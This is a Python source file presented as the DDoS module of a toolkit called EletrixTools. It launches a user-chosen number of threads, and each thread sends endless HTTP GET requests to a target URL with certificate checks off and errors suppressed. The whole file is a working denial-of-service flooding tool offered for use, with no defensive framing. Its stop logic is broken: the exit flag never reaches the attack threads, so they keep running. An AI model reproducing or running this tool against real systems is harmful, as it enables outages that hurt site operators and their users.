# EletrixTools - DDOS module
# Author: EletrixTime
# NOT COMPATIBLE WITH MDAPI
import threading
import requests
import time
import win32api
import os
target = None
stopped = False
threads_list = []
win32api.SetConsoleTitle("EletrixDDOS")
name = win32api.GetComputerName()
def attack():
    print("Launched thread")
    if stopped:
        return
    while True:
        try:
            requests.get(target, timeout=1,verify=False, allow_redirects=False)
        except:
            pass
EXEMPLE = "Arguments missing use this example : ddos [TARGET] [THREADS COUNT]"
def cli(args=None):

    global target
    try:
   
        if args[1] != None:

            target = args[1]
        else:
            print(EXEMPLE)
        if args[2] != None:
            threads = int(args[2])
            for i in range(threads):
                t = threading.Thread(target=attack)
                t.start()
                threads_list.append(t)
        else:
            print(EXEMPLE)
    except Exception as e:
        print(EXEMPLE) 
        return

    while True:
        print("TYPE : exit TO EXIT")
        xd = input("")
        if xd == "exit":
            print("exiting...")
            stopped = True
            for i in range(len(threads_list)):
                threads_list[i].join()
            print("DDOS stopped!")
            break
